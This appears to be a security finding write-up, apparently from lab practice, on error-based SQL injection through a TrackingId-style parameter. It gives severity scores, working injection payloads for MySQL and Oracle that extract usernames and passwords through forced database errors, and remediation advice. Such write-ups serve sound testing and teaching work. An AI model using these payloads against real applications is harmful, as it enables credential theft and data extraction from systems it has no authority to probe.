# SQL Injection - Error-Based SQL Injection

**Title:** Error-Based SQL Injection for Data Extraction

**Severity:** High

**Impact:** High

**Exploitability:** Medium

**CVSS Base Score:** 7.5

**CVSS v3 Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N

**Vulnerability Type:** SQL Injection

**Target:** TrackingId or similar parameter that triggers database errors

## Impact

Allows extraction of database contents directly through verbose error messages.

## Description

The application leaks information via database error messages when invalid SQL is supplied. Techniques like CAST to int or conditional errors can be used to surface data.

## Steps to Reproduce

Trigger errors to leak data:
```
xyz' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
```

MySQL:
```
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a
```

Oracle:
```
TrackingId=xyz'||(SELECT CASE WHEN LENGTH(password)>2 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||' --
```

CAST technique:
```
' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--
```

More efficient:
```
TrackingId=4yb0YyXSCJI1ZdsO'||(select password::int from users)--
```

## Recommendation

Disable verbose error messages in production. Use custom error handling. Use parameterized queries.

## References

- PortSwigger SQL Injection Cheat Sheet
- OWASP SQL Injection Prevention Cheat Sheet
